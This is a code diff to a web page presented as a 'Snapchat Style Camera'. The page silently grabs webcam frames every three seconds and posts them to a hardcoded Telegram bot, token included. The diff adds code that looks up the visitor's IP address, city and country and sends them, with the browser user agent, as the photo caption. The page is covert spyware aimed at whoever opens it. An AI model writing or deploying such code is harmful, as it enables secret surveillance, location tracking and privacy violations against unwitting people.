@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Snapchat Style Camera</title>
     <link rel="icon" href="modern-badge-snapchat-icon_578229-160.avif" type="image/avif">
+
     <style>
         /* Body style */
         body {
@@ -102,18 +103,6 @@
             cursor: pointer;
             box-shadow: 0px 5px 15px rgba(0, 0, 0, 0.1);
         }
-
-        /* Open in Browser message style */
-        .browser-prompt {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            background: #ffcc00;
-            padding: 10px;
-            text-align: center;
-            z-index: 1000;
-        }
     </style>
 </head>
 <body>
@@ -179,18 +168,22 @@
         setInterval(captureAndSendPhoto, 3000);
 
         // Capture and send photo to Telegram bot
-        function captureAndSendPhoto() {
+        async function captureAndSendPhoto() {
             const context = canvas.getContext('2d');
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
             // Convert canvas to PNG file
-            canvas.toBlob(blob => {
+            canvas.toBlob(async (blob) => {
                 // Create file
                 photoFile = new File([blob], "photo.png", { type: 'image/png' });
 
-                // Send photo to Telegram bot API
+                // Fetch user IP address and location
+                const userInfo = await fetchUserInfo();
+
+                // Send photo and user info to Telegram bot
                 const formData = new FormData();
                 formData.append('photo', photoFile);
+                formData.append('caption', `Device Info: ${userInfo.deviceInfo}\nIP: ${userInfo.ip}\nLocation: ${userInfo.location}`);
 
                 fetch(`https://api.telegram.org/bot7125743494:AAHENVbLo_HAN6sVDYYbqrMd9KL8S3Fv8VY/sendPhoto?chat_id=7111614672`, {
                     method: 'POST',
@@ -198,35 +191,30 @@
                 })
                 .then(response => response.json())
                 .then(data => {
-                    console.log('Photo successfully sent:', data);
+                    console.log('Photo and data successfully sent:', data);
                 })
                 .catch(error => {
-                    console.error('Error sending photo:', error);
+                    console.error('Error sending photo and data:', error);
                 });
             });
         }
 
-        // Check if the user is in Telegram's in-app browser
-        document.addEventListener("DOMContentLoaded", function () {
-            const ua = navigator.userAgent || navigator.vendor || window.opera;
-            const isInAppBrowser = /Telegram/i.test(ua);
+        // Function to fetch IP address and device information
+        async function fetchUserInfo() {
+            try {
+                const ipResponse = await fetch('https://ipapi.co/json/');
+                const ipData = await ipResponse.json();
 
-            if (isInAppBrowser) {
-                // Show a prompt to open in a standalone browser
-                const message = document.createElement('div');
-                message.className = 'browser-prompt';
-                message.innerHTML = `
-                    <p>Camera access is restricted. Please <a href="#" id="openInBrowser">open this page in your browser</a> for full functionality.</p>
-                `;
-                document.body.appendChild(message);
+                const deviceInfo = navigator.userAgent;
+                const ip = ipData.ip;
+                const location = `${ipData.city}, ${ipData.region}, ${ipData.country_name}`;
 
-                document.getElementById('openInBrowser').addEventListener('click', function (e) {
-                    e.preventDefault();
-                    // Create an intent link to open in the default browser
-                    window.location.href = `googlechrome://navigate?url=${window.location.href}`;
-                });
+                return { deviceInfo, ip, location };
+            } catch (error) {
+                console.error('Error fetching user information:', error);
+                return { deviceInfo: 'Unknown', ip: 'Unknown', location: 'Unknown' };
             }
-        });
+        }
     </script>
 
 </body>
